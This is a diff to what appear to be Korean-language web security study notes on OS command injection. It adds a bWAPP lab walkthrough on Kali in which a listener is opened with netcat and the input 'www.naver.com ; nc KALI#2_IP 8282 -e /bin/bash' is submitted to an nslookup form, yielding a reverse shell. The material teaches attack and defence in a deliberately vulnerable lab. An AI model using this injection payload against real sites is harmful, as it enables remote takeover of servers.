@@ -1460,9 +1460,7 @@ Parameterized Query #1
 
       
 
-
-
-* Eclipse > testController.java > open
+  * Eclipse > testController.java > open
 
   ```java
   @RequestMapping(value = "/test/command_test.do", method = RequestMethod.POST)
@@ -1532,8 +1530,7 @@ Parameterized Query #1
   		return buffer.toString();
   	}
   ```
-
-* test.jsp
+  * test.jsp
 
   ```html
   <form action="command_test.do" id="form5">
@@ -1559,7 +1556,18 @@ Parameterized Query #1
   </form>
   ```
 
-  
+* nslookup 기능을 지원하는 사이트에서의 공격
+
+  * @Kali#2 > 브라우저로 http://KALI#1/bWAPP (bee/bug) 접속
+  * Choose your bug : OS Command Injection 선택 후 Hack 버튼 클릭
+  * nslookup 서비스를 제공
+    root@kali:~# cd /var/www/html/bWAPP/root@kali:/var/www/html/bWAPP# gedit commandi.php 
+  * @Kali#2# nc -lvp 8282 ⇐ 8282 포트로 연결대기
+  * @Kali#2OS Command Injection 페이지에서 아래 내용을 입력
+    www.naver.com ; nc KALI#2_IP 8282 -e /bin/bash
+    ⇐ KALI#2의 8282포트로 연결 후 /bin/bash을 실행
+  * @Kali#2 터미널에서 쉘 명령어를 실행 → Kali#1에서 실행된 결과가 터미널에 출력
+    ![img](https://lh3.googleusercontent.com/kO_JYbHhDNhJvI7faqGvDcE6EniTSiy_koPvxuaG9HAerhGQXHL9l66DlyGBz49TGHeOXGcLymgMJ4jQPefYiAyihK9a5uz2GmBVMsWFNHHtV-g3R1R9oAX-yuoDov7DMTy6Bnh3)
 
 
 
